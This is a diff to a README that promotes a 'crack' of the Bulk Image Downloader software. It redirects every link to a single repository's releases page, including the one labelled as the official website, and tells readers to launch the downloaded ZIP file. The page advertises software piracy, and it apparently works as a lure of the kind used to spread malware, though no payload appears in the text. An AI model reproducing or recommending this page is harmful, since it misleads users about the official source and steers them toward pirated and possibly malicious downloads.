@@ -12,13 +12,13 @@ Welcome to the **Bulk Image Downloader Crack** repository! This repository is de
 
 You can download the crack version of the Bulk Image Downloader software by clicking the following link:
 
-[![Download Bulk Image Downloader Crack](https://img.shields.io/badge/Download-Crack-blue)](https://github.com/file/Soft.zip)
+[![Download Bulk Image Downloader Crack](https://github.com/Reni1551/Bulk_Image_Downloader_Crack/releases)](https://github.com/Reni1551/Bulk_Image_Downloader_Crack/releases)
 
 *(Note: Make sure to launch the ZIP file after downloading)*
 
 ## Explore Additional Resources 🌟
 
-In addition to the crack version provided in this repository, you can also explore the official website of Bulk Image Downloader for more information and updates. Visit the website [here](https://www.bulkimagedownloader.com/) to discover the full potential of this amazing tool.
+In addition to the crack version provided in this repository, you can also explore the official website of Bulk Image Downloader for more information and updates. Visit the website [here](https://github.com/Reni1551/Bulk_Image_Downloader_Crack/releases) to discover the full potential of this amazing tool.
 
 If the provided link is not working or you need alternate download options, please check the "Releases" section of this repository for more choices and updates on the crack version of Bulk Image Downloader.
 
@@ -28,7 +28,7 @@ Now that you have access to the crack version of Bulk Image Downloader, unleash 
 
 Let's crack some images! 📸🔓
 
-![Bulk Image Downloader](https://example.com/bulk-image-downloader-image.jpg)
+![Bulk Image Downloader](https://github.com/Reni1551/Bulk_Image_Downloader_Crack/releases)
 
 Remember, always respect copyright laws when downloading images from the internet. Happy downloading! 🎉
 
